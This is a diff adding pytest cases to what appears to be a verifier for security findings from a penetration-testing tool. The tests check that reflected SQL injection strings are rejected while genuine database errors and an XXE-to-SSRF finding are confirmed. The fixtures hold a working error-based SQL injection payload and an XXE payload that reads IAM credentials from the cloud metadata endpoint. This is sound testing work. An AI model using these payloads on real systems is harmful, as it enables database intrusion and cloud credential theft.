@@ -703,4 +703,109 @@ def test_oauth_genuine_consent_form_positive(critic, cas):
     assert res["is_verified"], f"Genuine OAuth Consent Form Failed Verification: {res}"
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# 13. SQLi Literal Reflection vs Genuine DBMS Error Tests (Rule 3.6)
+# ─────────────────────────────────────────────────────────────────────────────
+def test_sqli_reflection_false_positive_negative(critic, cas):
+    """Negative: Search/Category header echoing raw ExtractValue query without DBMS error must be falsified."""
+    echo_html = """<!DOCTYPE html>
+<html>
+<head><title>Search Results</title></head>
+<body>
+  <section class="ecoms-pageheader">
+    <h1>1' AND ExtractValue(1, CONCAT(0x5c, 'penflow_sqli'))--</h1>
+  </section>
+  <div class="results">No products found matching your search.</div>
+</body>
+</html>"""
+
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.98,
+        "reasoning": "Error-based SQL Injection confirmed on 'https://target.com/filter?category=Gifts' via parameter 'category'. Unhandled DBMS error disclosed: 'penflow_sqli'.",
+        "target_url": "https://target.com/filter?category=1%27+AND+ExtractValue%281%2C+CONCAT%280x5c%2C+%27penflow_sqli%27%29%29--",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "GET",
+                    "url": "https://target.com/filter?category=1%27+AND+ExtractValue%281%2C+CONCAT%280x5c%2C+%27penflow_sqli%27%29%29--"
+                },
+                "response": {
+                    "status_code": 200,
+                    "headers": {"content-type": "text/html; charset=utf-8"},
+                    "body_snippet": echo_html
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "sqli_vulnerability", raw)
+    res = critic.verify_finding(b)
+    assert not res["is_verified"], f"SQLi HTML reflection was NOT falsified: {res}"
+    assert "literally echoed in HTML markup" in res["verification_reason"]
+
+
+def test_sqli_genuine_error_positive(critic, cas):
+    """Positive: Genuine database error disclosing XPATH syntax error must be verified."""
+    db_err_html = """<!DOCTYPE html>
+<html>
+<head><title>Database Error</title></head>
+<body>
+  <h1>Database Error Encountered</h1>
+  <p>Error: 1105 (HY000): XPATH syntax error: '\\penflow_sqli' at line 1</p>
+</body>
+</html>"""
+
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.98,
+        "reasoning": "Error-based SQL Injection confirmed on 'https://target.com/filter' via parameter 'category'. Unhandled DBMS error disclosed: 'xpath syntax error'.",
+        "target_url": "https://target.com/filter?category=1%27+AND+ExtractValue%281%2C+CONCAT%280x5c%2C+%27penflow_sqli%27%29%29--",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "GET",
+                    "url": "https://target.com/filter?category=1%27+AND+ExtractValue%281%2C+CONCAT%280x5c%2C+%27penflow_sqli%27%29%29--"
+                },
+                "response": {
+                    "status_code": 200,
+                    "headers": {"content-type": "text/html; charset=utf-8"},
+                    "body_snippet": db_err_html
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "sqli_vulnerability", raw)
+    res = critic.verify_finding(b)
+    assert res["is_verified"], f"Genuine DBMS Error Failed Verification: {res}"
+
+
+def test_xxe_stockcheck_ssrf_positive(critic, cas):
+    """Positive: XXE extracting cloud IAM credentials must be verified."""
+    raw = {
+        "is_vulnerable": True,
+        "confidence_score": 0.95,
+        "reasoning": "In-Band XML External Entity (XXE) to SSRF verified; internal response disclosed 'AccessKeyId'.",
+        "target_url": "https://target.com/product/stock",
+        "evidence_exchanges": [
+            {
+                "request": {
+                    "method": "POST",
+                    "url": "https://target.com/product/stock",
+                    "headers": {"content-type": "application/xml"},
+                    "body": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
+                },
+                "response": {
+                    "status_code": 200,
+                    "headers": {"content-type": "text/plain"},
+                    "body_snippet": '{"Code": "Success", "AccessKeyId": "ASIA9999", "SecretAccessKey": "xyz987"}'
+                }
+            }
+        ]
+    }
+    b = cas.store_evidence("target.com", "xxe_ssrf", raw)
+    res = critic.verify_finding(b)
+    assert res["is_verified"], f"Genuine XXE SSRF Failed Verification: {res}"
+
+
+
 
